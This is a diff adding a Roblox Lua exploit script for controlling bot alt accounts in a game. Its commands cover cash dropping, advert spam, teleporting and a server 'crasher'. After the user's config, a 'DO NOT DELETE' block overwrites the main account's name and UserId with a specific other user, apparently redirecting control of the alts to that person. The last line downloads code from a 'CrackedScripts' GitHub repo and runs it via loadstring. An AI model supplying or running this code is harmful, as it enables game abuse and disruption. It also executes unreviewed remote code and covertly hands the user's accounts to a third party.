@@ -1,0 +1,48 @@
+-- old vers but works fine
+
+
+local players = game:GetService('Players')local mainaccount = nil -- ignore but DO NOT DELETE
+-- commands: 1.5
+-- goto (alts/location/player) (bot) - [teleports bots to player or location, only teleports one bot if bot argument is passed] (EDIT: DONT KNOW IF IT WORKS)
+-- goto (alts) - [teleports all alts to you]
+-- GOTO LOCATIONS: adminbase, safezone, traintrack, bank -- MORE COMING SOON
+-- ucdrop (start/stop) - [drops money at current location]
+-- destroy - [removes cash on alts screen (it glitches checkcash command)]
+-- fps (number) - [Changes FPS to the number argument]
+-- wallet - [equips wallet / unequips wallet]
+-- roast - [roast your buyers!]
+-- checkcash - [Alt1 tells you how much cash is dropped]
+-- advert (start/stop) - [Alts starts sending your advert message]
+-- lowgfx - [Removes Textures on every Alt Account]
+-- loopdestroy (start/stop) - [Enable/Disable Loopdestroying cash on ground]
+-- swagcrash - [Executes Swagcrasher]
+-- setup  (adminbase/club/basketball) - [Setups Alt on the Location]
+
+
+
+
+--SCRIPT:
+mainaccount = players.USERNAMEHERE -- change "USERNAMEHERE" to your main accounts name, if the script is not working either your name starts with a number or you deleted the variable "players"
+getgenv().admsg = 'message here' -- put your message here
+getgenv().adcooldown = '16' -- put a cooldown in seconds here (Standard: 16)
+getgenv().fpskey = 'k' -- hotkey to lock fpskey
+getgenv().fps = '5' -- your own prefix
+getgenv().prefix = '.' -- your own prefix here
+getgenv().Alts = {
+    Alt1 = 1, -- put userids here 20 ALTS MAX!!!! for ex. Alt6 = (alts userid)
+    Alt2 = 1,
+    Alt3 = 1,
+    Alt4 = 1,
+    Alt5 = 1,
+}
+
+wait()
+
+-- DO NOT DELETE
+mainaccount.Name = "Jeremyawesomebro"
+mainaccount.UserId = 312077874
+mainaccount.Character.Name = "Jeremyawesomebro"
+--
+
+wait()
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/rip2point/CrackedScripts.lua/main/elsaltcontrol"))()
